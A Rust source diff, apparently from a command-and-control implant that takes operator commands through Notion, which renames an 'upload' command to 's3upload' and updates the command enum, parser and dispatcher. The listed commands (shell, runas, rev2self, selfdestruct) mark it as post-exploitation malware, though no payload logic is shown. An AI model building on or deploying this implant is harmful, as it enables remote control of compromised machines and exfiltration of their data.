@@ -26,7 +26,7 @@ pub mod shell;
 mod shutdown;
 mod whoami;
 mod unknown;
-mod upload;
+mod s3upload;
 mod selfdestruct;
 mod sysinfo;
 
@@ -65,12 +65,12 @@ pub enum CommandType {
     Save,
     Selfdestruct,
     Runas,
+    S3Upload,
     Shell,
     Shutdown,
     Sysinfo,
     Whoami,
-    Unknown,
-    Upload
+    Unknown
 }
 
 /// Simple errors for the construction of a NotionCommand.
@@ -188,13 +188,13 @@ impl NotionCommand {
                 "pwd"          => CommandType::Pwd,
                 "rev2self"     => CommandType::Rev2Self,
                 "runas"        => CommandType::Runas,
+                "s3upload"     => CommandType::S3Upload,
                 "save"         => CommandType::Save,
                 "selfdestruct" => CommandType::Selfdestruct,
                 "shell"        => CommandType::Shell,
                 "shutdown"     => CommandType::Shutdown,
                 "sysinfo"      => CommandType::Sysinfo,
                 "whoami"       => CommandType::Whoami,
-                "upload"       => CommandType::Upload,
                 _              => CommandType::Unknown,
             };
             return Ok(NotionCommand { command_type: command_type, args: command_args});
@@ -219,14 +219,14 @@ impl NotionCommand {
             CommandType::Pwd          => pwd::handle().await,
             CommandType::Rev2Self     => rev2self::handle().await,
             CommandType::Runas        => runas::handle(&self.args).await,
+            CommandType::S3Upload     => s3upload::handle(&mut self.args, logger, config_options).await,
             CommandType::Save         => save::handle(&mut self.args, config_options).await,
             CommandType::Selfdestruct => selfdestruct::handle().await,
             CommandType::Shell        => shell::handle(&mut self.args).await,
             CommandType::Shutdown     => shutdown::handle().await,
             CommandType::Sysinfo      => sysinfo::handle().await,
             CommandType::Whoami       => whoami::handle().await,
-            CommandType::Unknown      => unknown::handle().await,
-            CommandType::Upload       => upload::handle(&mut self.args, config_options).await,
+            CommandType::Unknown      => unknown::handle().await
         }
     }
 }
